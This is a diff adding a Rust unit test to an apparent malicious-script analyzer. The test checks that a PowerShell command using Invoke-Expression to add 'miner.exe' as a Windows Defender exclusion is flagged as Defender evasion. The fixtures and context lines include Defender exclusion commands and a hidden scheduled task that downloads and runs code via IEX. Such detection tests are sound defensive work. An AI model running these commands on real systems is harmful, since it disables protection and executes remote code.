@@ -3785,6 +3785,31 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn mppreference_invoke_expression_exclusion_process_uses_list_target() {
+        let script = br#"powershell -Command "$ListProcess = @('miner.exe'); $First = 'Add-MpPreference -ExclusionProcess '; $Third = ' -Force'; ForEach ($Path in $ListProcess) { Invoke-Expression ($First + $Path + $Third) }""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "exclusion-process" && target == "miner.exe"
+            )),
+            "Invoke-Expression Defender exclusion target missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "exclusion-process" && target == "; $Third ="
+            )),
+            "assignment fragment should not be reported as exclusion target: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn mppreference_exclusion_lists_emit_each_defender_evasion_trait() {
         let script =
             br#"powershell -Command "Add-MpPreference -ExclusionPath C:\Users\Public,C:\Temp"
